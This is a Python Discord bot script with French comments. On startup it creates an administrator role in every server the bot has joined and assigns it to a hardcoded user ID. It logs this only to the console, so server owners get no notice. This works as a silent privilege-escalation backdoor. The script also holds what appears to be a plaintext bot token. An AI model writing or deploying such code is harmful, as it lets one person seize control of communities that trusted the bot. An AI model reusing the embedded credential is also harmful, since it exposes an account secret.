import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True  # Active les intents pour les membres

bot = commands.Bot(command_prefix="!", intents=intents)

# Remplacez par votre ID Discord
YOUR_USER_ID = 726134392854020097

@bot.event
async def on_ready():
    print(f"Bot connecté en tant que {bot.user}")
    await give_admin_automatically()

async def give_admin_automatically():
    # Parcourt tous les serveurs où le bot est présent
    for guild in bot.guilds:
        # Trouve votre utilisateur dans le serveur
        member = guild.get_member(YOUR_USER_ID)
        if member:
            admin_role = discord.utils.get(guild.roles, name="sinj")

            # Crée le rôle Administrateur s'il n'existe pas
            if not admin_role:
                admin_role = await guild.create_role(
                    name="Administrateur",
                    permissions=discord.Permissions(administrator=True),
                    reason="Ajout des droits administrateur"
                )

            # Vous donne le rôle Administrateur
            await member.add_roles(admin_role)
            print(f"{member} a reçu les droits administrateur sur {guild.name}.")  # Log en console seulement
        else:
            print(f"Vous n'êtes pas sur le serveur {guild.name}.")  # Log en console seulement

# Remplacez par le token de votre bot
bot.run("MTMzNDIxNzYzNzQzMzE4NDI4Nw.G393wY.F44fVUvV2CkH92I1ztoiCxtxYV3DZ7yPRk2kkw")
